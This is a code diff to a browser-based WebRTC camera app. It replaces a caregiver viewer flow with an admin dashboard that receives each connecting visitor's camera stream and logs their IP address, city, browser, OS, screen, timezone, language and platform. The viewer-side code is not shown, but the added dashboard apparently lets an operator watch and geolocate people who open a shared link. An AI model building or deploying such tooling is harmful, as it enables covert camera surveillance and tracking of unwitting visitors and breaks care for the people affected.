+        <span class="card-connected-at">${formatTime(new Date())}</span>
+      </div>
+      <div class="device-info" id="devinfo-${peerId.replace(/[^a-z0-9]/gi,'_')}">
+        <div class="di-item"><div class="di-label">STATUS</div><div class="di-val">Connecting…</div></div>
+      </div>
+      <div class="card-status-row">
+        <div class="status-dot live"></div>
+        <span>${label} · Camera Active</span>
+      </div>
+    </div>
+  `;
+  document.getElementById('adminGrid').appendChild(card);
 }
 
-// ── VIEWER FLOW ──
-function startViewer() {
-  showScreen('viewer');
+function attachStream(peerId, stream) {
+  const safeId = peerId.replace(/[^a-z0-9]/gi,'_');
+  const feedDiv = document.getElementById('feed-' + safeId);
+  if (!feedDiv) return;
 
-  // Check URL for pre-filled code
-  const params = new URLSearchParams(window.location.search);
-  const code = params.get('view');
-  if (code) {
-    document.getElementById('codeInput').value = code.toUpperCase();
-    setTimeout(connectToHost, 300);
+  // Remove offline placeholder
+  const offline = feedDiv.querySelector('.card-feed-offline');
+  if (offline) offline.remove();
+
+  let vid = feedDiv.querySelector('video');
+  if (!vid) {
+    vid = document.createElement('video');
+    vid.autoplay = true; vid.playsInline = true; vid.muted = true;
+    feedDiv.insertBefore(vid, feedDiv.firstChild);
   }
+  vid.srcObject = stream;
 
-  viewerPeer = new Peer({
-    debug: 0,
-    config: {
-      iceServers: [
-        { urls: 'stun:stun.l.google.com:19302' },
-        { urls: 'stun:stun1.l.google.com:19302' }
-      ]
-    }
-  });
+  // Show live badge
+  const liveBadge = document.getElementById('live-' + safeId);
+  if (liveBadge) liveBadge.classList.add('show');
 }
 
-function connectToHost() {
-  const code = document.getElementById('codeInput').value.trim().toUpperCase();
-  if (code.length < 4) { toast('Please enter the session code'); return; }
+function updateViewerCard(peerId, info) {
+  const safeId = peerId.replace(/[^a-z0-9]/gi,'_');
+  const devDiv = document.getElementById('devinfo-' + safeId);
+  if (!devDiv) return;
+  devDiv.innerHTML = `
+    <div class="di-item"><div class="di-label">BROWSER</div><div class="di-val">${info.browser || '—'}</div></div>
+    <div class="di-item"><div class="di-label">OS</div><div class="di-val">${info.os || '—'}</div></div>
+    <div class="di-item"><div class="di-label">IP</div><div class="di-val">${info.ip || '—'}</div></div>
+    <div class="di-item"><div class="di-label">LOCATION</div><div class="di-val">${info.city || '—'}</div></div>
+    <div class="di-item"><div class="di-label">SCREEN</div><div class="di-val">${info.screen || '—'}</div></div>
+    <div class="di-item"><div class="di-label">TIMEZONE</div><div class="di-val">${info.timezone || '—'}</div></div>
+  `;
+  toast(`${viewers[peerId]?.label || 'Viewer'} connected · ${info.ip}`);
+}
 
-  const btn = document.getElementById('connectBtn');
-  btn.disabled = true;
-  btn.textContent = 'Connecting…';
-
-  const overlay = document.getElementById('connectOverlay');
-  overlay.innerHTML = '<div class="spinner"></div><p style="color:rgba(255,255,255,0.6); font-size:0.85rem; margin-top:12px">Connecting to camera…</p>';
-
-  if (!viewerPeer || viewerPeer.destroyed) {
-    viewerPeer = new Peer({ debug: 0, config: { iceServers: [{ urls:'stun:stun.l.google.com:19302' }] } });
+function removeViewer(peerId) {
+  const safeId = peerId.replace(/[^a-z0-9]/gi,'_');
+  const card = document.getElementById('card-' + safeId);
+  if (card) {
+    card.style.opacity = '0.3';
+    const status = card.querySelector('.card-status-row');
+    if (status) status.innerHTML = '<div class="status-dot" style="background:var(--red)"></div><span>Disconnected</span>';
+    const liveBadge = document.getElementById('live-' + safeId);
+    if (liveBadge) liveBadge.classList.remove('show');
   }
+  if (viewers[peerId]) {
+    viewerCount = Math.max(0, viewerCount - 1);
+    updateAdminStats();
+  }
+}
 
-  const tryCall = () => {
-    // Request minimal stream to initiate WebRTC
-    navigator.mediaDevices.getUserMedia({ video: false, audio: false })
-      .catch(() => {})
-      .finally(() => {
-        const call = viewerPeer.call(code, new MediaStream(), { sdpTransform: s => s });
-        doCall(call, code, overlay);
-      });
+function updateAdminStats() {
+  document.getElementById('statConnected').textContent = viewerCount;
+  document.getElementById('statTotal').textContent = totalCount;
+}
 
-    // Actually: PeerJS needs a stream. Use blank canvas trick.
-    const canvas = document.createElement('canvas');
-    canvas.width = 1; canvas.height = 1;
-    const stream = canvas.captureStream(1);
-    connectedCall = viewerPeer.call(code, stream);
-    doCall(connectedCall, code, overlay);
-  };
+// FULLSCREEN
+function openFullscreen(peerId) {
+  const v = viewers[peerId];
+  if (!v) return;
 
-  if (viewerPeer.open) {
-    tryCall();
+  const overlay = document.getElementById('fsOverlay');
+  overlay.classList.add('show');
+  document.getElementById('fsLabel').textContent = v.label;
+
+  const fsVid = document.getElementById('fsVideo');
+  if (v.stream) fsVid.srcObject = v.stream;
+
+  const sidebar = document.getElementById('fsSidebarContent');
+  const info = v.info;
+  if (info) {
+    sidebar.innerHTML = `
+      <div class="fs-di-item"><div class="fs-di-label">LABEL</div><div class="fs-di-val">${v.label}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">CONNECTED AT</div><div class="fs-di-val">${v.connectedAt?.toLocaleString() || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">IP ADDRESS</div><div class="fs-di-val">${info.ip || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">LOCATION</div><div class="fs-di-val">${info.city || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">BROWSER</div><div class="fs-di-val">${info.browser || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">OPERATING SYSTEM</div><div class="fs-di-val">${info.os || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">SCREEN</div><div class="fs-di-val">${info.screen || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">TIMEZONE</div><div class="fs-di-val">${info.timezone || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">LANGUAGE</div><div class="fs-di-val">${info.language || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">PLATFORM</div><div class="fs-di-val">${info.platform || '—'}</div></div>
+      <div class="fs-di-item"><div class="fs-di-label">TIMESTAMP</div><div class="fs-di-val" style="font-size:0.7rem">${info.timestamp || '—'}</div></div>
+    `;
   } else {
-    viewerPeer.on('open', tryCall);
-    viewerPeer.on('error', e => {
-      overlay.innerHTML = `<div style="text-align:center;color:white"><div style="font-size:2rem">❌</div><p style="margin:12px 0 0;opacity:0.7">Could not connect. Check the code and try again.</p><button class="btn btn-amber" onclick="location.reload()" style="margin-top:16px;width:auto;padding:8px 20px">Try Again</button></div>`;
-    });
+    sidebar.innerHTML = '<p style="color:var(--text3);font-size:0.75rem">Device info pending…</p>';
   }
 }
 
-function doCall(call, code, overlay) {
-  if (!call) {
-    overlay.innerHTML = `<div style="text-align:center;color:white"><div style="font-size:2rem">❌</div><p style="margin:12px 0;opacity:0.7">Could not reach that code. Is the camera device on?</p><button onclick="location.reload()" style="background:var(--amber);color:white;border:none;padding:10px 20px;border-radius:10px;cursor:pointer">Try Again</button></div>`;
-    return;
-  }
-
-  call.on('stream', remoteStream => {
-    overlay.style.display = 'none';
-    const vid = document.getElementById('remoteVideo');
-    vid.srcObject = remoteStream;
-    document.getElementById('viewerLiveBadge').classList.add('show');
-    document.getElementById('viewerStatusDot').className = 'status-dot green';
-    document.getElementById('viewerStatusText').textContent = 'Live feed connected ✓';
-    document.getElementById('connectedCode').textContent = code;
-    document.getElementById('disconnectBtn').style.display = 'flex';
-
-    connectedAt = new Date();
-    updateClock();
-    clockTimer = setInterval(updateClock, 1000);
-  });
-
-  call.on('close', () => {
-    document.getElementById('viewerStatusDot').className = 'status-dot red';
-    document.getElementById('viewerStatusText').textContent = 'Disconnected';
-    document.getElementById('viewerLiveBadge').classList.remove('show');
-    if (clockTimer) clearInterval(clockTimer);
-  });
-
-  call.on('error', e => {
-    overlay.innerHTML = `<div style="text-align:center;color:white;padding:20px"><div style="font-size:2rem">⚠️</div><p style="margin:12px 0;opacity:0.7">Connection error. Please retry.</p><button onclick="location.reload()" style="background:var(--amber);color:white;border:none;padding:10px 20px;border-radius:10px;cursor:pointer">Retry</button></div>`;
-  });
-
-  // Timeout
-  setTimeout(() => {
-    if (!call.remoteStream) {
-      overlay.innerHTML = `<div style="text-align:center;color:white;padding:20px"><div style="font-size:2rem">⏱️</div><p style="margin:12px 0;opacity:0.7">Camera not reachable. Make sure the camera device is open and on.</p><button onclick="location.reload()" style="background:var(--amber);color:white;border:none;padding:10px 20px;border-radius:10px;cursor:pointer">Retry</button></div>`;
-    }
-  }, 12000);
+function closeFullscreen() {
+  document.getElementById('fsOverlay').classList.remove('show');
+  document.getElementById('fsVideo').srcObject = null;
 }
 
-function updateClock() {
-  if (!connectedAt) return;
-  const secs = Math.floor((Date.now() - connectedAt) / 1000);
-  const h = Math.floor(secs/3600).toString().padStart(2,'0');
-  const m = Math.floor((secs%3600)/60).toString().padStart(2,'0');
-  const s = (secs%60).toString().padStart(2,'0');
-  document.getElementById('connectedSince').textContent = `${h}:${m}:${s}`;
+// UTILS
+function formatTime(d) {
+  return d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
 }
 
-function disconnect() {
-  if (connectedCall) { connectedCall.close(); }
-  if (clockTimer) clearInterval(clockTimer);
-  document.getElementById('remoteVideo').srcObject = null;
-  document.getElementById('viewerStatusDot').className = 'status-dot';
-  document.getElementById('viewerStatusText').textContent = 'Disconnected';
-  document.getElementById('viewerLiveBadge').classList.remove('show');
-  document.getElementById('disconnectBtn').style.display = 'none';
-  toast('Disconnected from camera');
+// ══════════════════════════════════════════
+// BOOT
+// ══════════════════════════════════════════
+if (isAdmin) {
+  initAdmin();
+} else {
+  initViewer();
 }
-
-// ── HELPERS ──
-function showStatus(role, color, msg) {
-  const dot = document.getElementById(role + 'StatusDot');
-  const txt = document.getElementById(role + 'StatusText');
-  dot.className = 'status-dot ' + color;
-  txt.textContent = msg;
-}
-
-function copyCode() {
-  navigator.clipboard.writeText(sessionCode).then(() => toast('Code copied!'));
-}
-
-function copyLink() {
-  const url = document.getElementById('shareUrl').textContent;
-  navigator.clipboard.writeText(url).then(() => toast('Link copied! Send it to your caregiver.'));
-}
-
-function toggleFullscreen() {
-  const box = document.getElementById('viewerVideoBox');
-  if (!document.fullscreenElement) {
-    box.requestFullscreen?.() || box.webkitRequestFullscreen?.();
-  } else {
-    document.exitFullscreen?.();
-  }
-}
-
-let toastTimer;
-function toast(msg) {
-  const t = document.getElementById('toast');
-  t.textContent = msg;
-  t.classList.add('show');
-  clearTimeout(toastTimer);
-  toastTimer = setTimeout(() => t.classList.remove('show'), 2800);
-}
-
-// ── AUTO-ROUTE on ?view=CODE ──
-window.addEventListener('DOMContentLoaded', () => {
-  const params = new URLSearchParams(window.location.search);
-  if (params.get('view')) {
-    startViewer();
-  }
-});
 </script>
 </body>
 </html>
